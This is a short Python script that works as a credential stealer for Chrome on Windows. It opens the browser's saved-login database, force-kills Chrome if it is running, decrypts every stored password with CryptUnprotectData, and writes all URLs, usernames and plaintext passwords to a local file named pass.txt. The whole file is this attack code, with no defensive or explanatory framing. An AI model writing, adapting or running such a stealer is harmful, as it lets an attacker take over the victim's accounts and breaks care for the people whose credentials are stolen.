from getpass import getuser
from os import path, system
import sqlite3
import win32.win32crypt
import psutil


login_path = 'C:/Users/' + getuser() + '/AppData/Local/Google/Chrome/User Data/Default/Login Data'

def getPasswords():
    c = sqlite3.connect(login_path)
    cursor = c.cursor()
    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)

    login_data = cursor.fetchall()
    credentials = {}

    for url, user_name, pwd, in login_data:
        pwd = win32.win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
        credentials[url] = (user_name, pwd[1])
    
    passwords = ''
    for url, user_name, pwd, in login_data:
        pwd = win32.win32crypt.CryptUnprotectData(pwd)
        credentials[url] = (user_name, pwd[1].decode('utf-8'))
        passwords += '\n\nURL: ' + url + '\nUSERNAME: ' + user_name + ' PASSWORD: ' + pwd[1].decode('utf-8')
    return passwords

def isRunning(procName):
    for proc in psutil.process_iter():
        try:
            if procName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

if path.exists(login_path):
        userpath = "C:/Users/" + getuser() + '/Documents'
        if isRunning('chrome'):
            system('@echo off | taskkill /F /IM chrome.exe | cls')
        with open('pass.txt', 'w') as f:
            f.write(getPasswords())            
else:
    exit()
